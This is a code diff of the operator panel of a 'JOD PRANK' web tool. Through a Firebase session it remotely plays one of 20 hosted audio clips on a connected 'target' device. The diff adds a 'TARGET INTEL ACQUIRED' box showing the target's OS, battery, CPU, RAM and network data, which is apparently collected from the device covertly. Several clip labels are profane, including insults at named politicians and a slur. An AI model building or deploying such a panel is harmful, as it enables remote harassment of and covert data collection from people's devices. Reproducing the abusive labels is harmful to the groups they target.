@@ -1,9 +1,14 @@
-'<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JOD PRANK - Secure Terminal</title>
+    
+    <!-- ANTI-CACHE TAGS -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     
     <link rel="manifest" href="manifest.json">
     <meta name="theme-color" content="#00ff00">
@@ -20,6 +25,14 @@
         #main-app { display: none; flex-direction: column; align-items: center; padding: 20px; }
         h1 { text-align: center; text-shadow: 0 0 10px #00ff00; margin-bottom: 5px; }
         .status { color: #ff0000; font-weight: bold; margin-bottom: 20px; text-shadow: 0 0 5px #ff0000; text-align: center; }
+        
+        /* INTEL BOX STYLING */
+        #intel-box { display: none; width: 100%; max-width: 600px; border: 1px solid #00ff00; background: rgba(0, 255, 0, 0.05); padding: 15px; margin-bottom: 25px; box-sizing: border-box; box-shadow: inset 0 0 15px rgba(0,255,0,0.1); }
+        .intel-header { border-bottom: 1px dashed #00ff00; padding-bottom: 5px; margin-bottom: 10px; font-weight: bold; text-align: center; letter-spacing: 2px; }
+        .intel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 0.9em; }
+        .intel-item { color: #fff; }
+        .intel-data { color: #00ff00; font-weight: bold; }
+
         .qr-section { border: 2px dashed #00ff00; padding: 30px; margin-bottom: 30px; text-align: center; background-color: #0a0a0a; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
         .qr-placeholder { width: 150px; height: 150px; background-color: #ffffff; margin: 0 auto 10px auto; display: flex; align-items: center; justify-content: center; padding: 10px; border-radius: 5px; }
         .dashboard { width: 100%; max-width: 600px; }
@@ -57,6 +70,18 @@
     <div id="main-app">
         <h1>[ JOD PRANK ]</h1>
         <div class="status" id="connection-status">STATUS: OFFLINE | WAITING FOR TARGET...</div>
+
+        <!-- NEW INTEL BOX -->
+        <div id="intel-box">
+            <div class="intel-header">>> TARGET INTEL ACQUIRED <<</div>
+            <div class="intel-grid">
+                <div class="intel-item">OS: <span class="intel-data" id="i-os">--</span></div>
+                <div class="intel-item">BATTERY: <span class="intel-data" id="i-batt">--</span></div>
+                <div class="intel-item">CPU: <span class="intel-data" id="i-cpu">--</span></div>
+                <div class="intel-item">RAM: <span class="intel-data" id="i-ram">--</span></div>
+                <div class="intel-item">NETWORK: <span class="intel-data" id="i-net">--</span></div>
+            </div>
+        </div>
 
         <div class="qr-section">
             <div class="qr-placeholder" id="qr-box"></div>
@@ -134,19 +159,33 @@
         const sessionRef = db.ref('prank_sessions/' + sessionID);
         sessionRef.set({ status: "waiting", command_type: "none", command_payload: "none", timestamp: Date.now() });
 
+        // UPDATE KIYA HUA LISTENER (INTEL KE LIYE)
         sessionRef.on('value', (snapshot) => {
             const data = snapshot.val();
             const statusText = document.getElementById('connection-status');
+            const intelBox = document.getElementById('intel-box');
+            
             if(data && data.status === 'connected') {
                 statusText.innerText = "STATUS: TARGET CONNECTED! FIRE AT WILL.";
-                statusText.style.color = "#00ff00"; statusText.style.textShadow = "0 0 10px #00ff00";
+                statusText.style.color = "#00ff00"; 
+                statusText.style.textShadow = "0 0 10px #00ff00";
+                
+                intelBox.style.display = "block";
+                document.getElementById('i-os').innerText = data.target_os || "Unknown";
+                document.getElementById('i-batt').innerText = data.target_battery || "Unknown";
+                document.getElementById('i-cpu').innerText = data.target_cpu || "Hidden";
+                document.getElementById('i-ram').innerText = data.target_ram || "Hidden";
+                document.getElementById('i-net').innerText = data.target_net || "Unknown";
+                
             } else if (data && data.status === 'killed') {
                 statusText.innerText = "STATUS: DISCONNECTED BY ADMIN";
-                statusText.style.color = "gray"; statusText.style.textShadow = "none";
+                statusText.style.color = "gray"; 
+                statusText.style.textShadow = "none";
+                intelBox.style.display = "none";
             }
         });
 
-        // 20 AUDIO LINKS (Apne links yahan replace kar lena)
+        // TERE 20 AUDIO LINKS (SAME TO SAME)
         const audioLinks = [
             "https://files.catbox.moe/i0zxp5.mp3",       
             "https://files.catbox.moe/48039r.mp3", 
@@ -158,40 +197,29 @@
             "https://files.catbox.moe/hx9xg6.mp3",                                   
             "https://files.catbox.moe/a7pive.mp3",                                   
             "https://files.catbox.moe/nv9e85.mp3",
-            
-            "  https://files.catbox.moe/up8h9g.mp3  ",
-            
-            "https://files.catbox.moe/n1tjar.mp3  ",
-            
-            "  https://files.catbox.moe/ssqhju.mp3 ",
-            
-            " https://www.image2url.com/r2/default/audio/1784966049724-392d6d63-9536-46b9-9112-d21e35c82e6f.mp3   ",
-            
-            "   https://files.catbox.moe/0owzgf.mp3 ",
-            
-            "  https://files.catbox.moe/ruknnn.mp3 ",
-            
-            " https://files.catbox.moe/b5cdh2.mp3  ",
-            
-            " https://files.catbox.moe/vq4lk3.mp3  ",
-            
-            " https://files.catbox.moe/cuiqui.mp3 ",
-            
-            " https://files.catbox.moe/8d8cfm.mp3 "
+            "https://files.catbox.moe/up8h9g.mp3",
+            "https://files.catbox.moe/n1tjar.mp3",
+            "https://files.catbox.moe/ssqhju.mp3",
+            "https://www.image2url.com/r2/default/audio/1784966049724-392d6d63-9536-46b9-9112-d21e35c82e6f.mp3",
+            "https://files.catbox.moe/0owzgf.mp3",
+            "https://files.catbox.moe/ruknnn.mp3",
+            "https://files.catbox.moe/b5cdh2.mp3",
+            "https://files.catbox.moe/vq4lk3.mp3",
+            "https://files.catbox.moe/cuiqui.mp3",
+            "https://files.catbox.moe/8d8cfm.mp3"
         ];
 
-        // 20 AUDIO NAAM (Apne naam yahan replace kar lena)
+        // TERE 20 AUDIO NAAM (SAME TO SAME)
         const audioNames = [
             "SCRIMING CHEKEN", "GET OUT", "CAT LAUGH", "FAAH", "HAKLA SARUKH", 
             "BKL MODI", "AMIR BKL", "PAKAD MC", "HOSH ME AAO", "GIRL FU",
-            "AMMA AUDIO", " CHUT", " CHUT GAYI", " MODI SAIYARA", "GAND PE RAPTA  ",
-            "KYU RE MC  ", "  GAY ", "SPIDER MAN ", " BHISADI KE ", " CID "
+            "AMMA AUDIO", "CHUT", "CHUT GAYI", "MODI SAIYARA", "GAND PE RAPTA",
+            "KYU RE MC", "GAY", "SPIDER MAN", "BHISADI KE", "CID"
         ];
 
         const audioGrid = document.getElementById('audio-grid');
         audioLinks.forEach((link, index) => {
             const btn = document.createElement('button');
-            // '01', '02' format maintain karne ke liye
             let num = (index + 1 < 10) ? '0' + (index + 1) : (index + 1);
             btn.innerText = `${audioNames[index]} [${num}]`;
             btn.onclick = () => triggerAudio(index);
